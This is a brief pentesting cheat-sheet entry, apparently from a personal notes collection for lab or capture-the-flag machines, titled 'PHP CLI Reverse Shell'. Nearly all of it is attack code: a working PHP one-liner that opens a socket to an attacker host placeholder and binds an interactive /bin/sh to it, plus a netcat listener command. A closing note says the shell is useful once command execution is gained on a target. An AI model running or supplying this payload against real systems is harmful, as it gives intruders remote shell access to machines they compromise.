# PHP CLI Reverse Shell

A standard one-liner PHP reverse shell using `fsockopen` and `exec`.

Used on: **<Machine>**

## One-liner

<!-- cmd: linux -->
```bash
php -r '$sock=fsockopen("$LHOST",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## Listener

<!-- cmd: linux -->
```bash
nc -lvnp 8080
```

## Notes

- Very useful when you have command execution and PHP is installed on the target.
